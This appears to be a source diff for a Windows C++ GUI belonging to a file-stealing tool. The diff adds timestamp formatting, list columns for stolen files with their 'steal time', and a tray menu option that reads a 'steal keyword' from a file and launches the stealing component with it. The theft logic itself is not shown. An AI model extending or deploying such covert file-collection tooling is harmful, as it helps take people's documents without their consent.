@@ -170,7 +170,35 @@ int UiMain(CmdLineW& cl, wstring svcName) {
 	return (int)msg.wParam;
 }
 
+static std::wstring FileTimeToString(const ULONGLONG& nft) {
+	ULARGE_INTEGER ui{};
+	ui.QuadPart = nft;
+	FILETIME ft{
+		.dwLowDateTime = ui.LowPart,
+		.dwHighDateTime = ui.HighPart,
+	};
+	SYSTEMTIME st;
+	FileTimeToSystemTime(&ft, &st);
 
+	// 创建一个用于日期和时间的缓冲区  
+	wchar_t dateBuffer[128];
+	wchar_t timeBuffer[128];
+	wchar_t dateTimeBuffer[256];
+
+	// 使用GetDateFormat格式化日期部分  
+	GetDateFormatW(LOCALE_USER_DEFAULT, DATE_SHORTDATE, &st,
+		nullptr, dateBuffer, sizeof(dateBuffer) / sizeof(wchar_t));
+
+	// 使用GetTimeFormat格式化时间部分  
+	GetTimeFormatW(LOCALE_USER_DEFAULT, 0, &st, nullptr,
+		timeBuffer, sizeof(timeBuffer) / sizeof(wchar_t));
+
+	// 将日期和时间合并到同一个字符串中，并添加空格分隔  
+	swprintf_s(dateTimeBuffer, sizeof(dateTimeBuffer) / sizeof(wchar_t),
+		L"%s %s", dateBuffer, timeBuffer);\
+
+	return dateTimeBuffer;
+}
 
 
 // 窗口过程函数  
@@ -278,16 +306,17 @@ static LRESULT CALLBACK WndProc_MainWnd(HWND hwnd, UINT message, WPARAM wp, LPAR
 		vector<CwIndex_MetaData> mds;
 		for (auto& i : filename) {
 			if (CwIndexData_GetFileData(i, mds)) for (auto& j : mds) {
-				wcscpy_s(szBuffer, i.substr(i.find_last_of(L"\\") + 1).c_str());
+				wcscpy_s(szBuffer, i.find(L"\\") != i.npos ? 
+					i.substr(i.find_last_of(L"\\") + 1).c_str() : i.c_str());
 				lvI.iSubItem = 0;
 				ListView_InsertItem(data->hList1, &lvI);
 				wcscpy_s(szBuffer, i.c_str());
 				lvI.iSubItem = 1;
 				ListView_SetItem(data->hList1, &lvI);
-				wcscpy_s(szBuffer, to_wstring(j.file_modify_time).c_str());
+				wcscpy_s(szBuffer, FileTimeToString(j.file_modify_time).c_str());
 				lvI.iSubItem = 2;
 				ListView_SetItem(data->hList1, &lvI);
-				wcscpy_s(szBuffer, to_wstring(j.steal_time).c_str());
+				wcscpy_s(szBuffer, FileTimeToString(j.steal_time).c_str());
 				lvI.iSubItem = 3;
 				ListView_SetItem(data->hList1, &lvI);
 				wcscpy_s(szBuffer, j.fileId);
@@ -481,6 +510,26 @@ static LRESULT CALLBACK WndProc_TrayWnd(HWND hwnd, UINT message, WPARAM wp, LPAR
 		case ID_MENU_stolenppts:
 			Process.StartOnly(L"\"" + GetProgramDirW() + L"\" --type=main-ui"
 				" --service-name=\"" + szSvcName + L"\"");
+			break;
+
+		case ID_MENU_viewlic:
+			ShellExecuteW(hwnd, L"open", L"https://www.gnu.org/licenses/gpl-3.0-"
+				"standalone.html", NULL, NULL, SW_NORMAL);
+			break;
+
+		case ID_MENU_TEMPOPT1:
+		{// 临时选项，这个星期来不及做其他的了而已 功能完善之后删掉
+			fstream fp(L"path_keyword.txt", ios::in);
+			char kw[256]{}; fp.getline(kw, 256);
+			fp.close();
+			wstring k = s2ws(kw);
+
+			if (MessageBox(NULL, (L"请确认偷取关键词为：" + k).c_str(), L"提示",
+				MB_ICONQUESTION | MB_OKCANCEL | MB_DEFBUTTON2) != IDOK) break;
+			// {C827BE9B-EDAC-4C6B-9542-031A0B5D0B04}
+			Process.StartOnly(L"\"" + GetProgramDirW() + L"\" --type={C827BE9B-EDAC-"
+				"4C6B-9542-031A0B5D0B04} -k\"" + k + L"\"");
+		}
 			break;
 		
 		default:
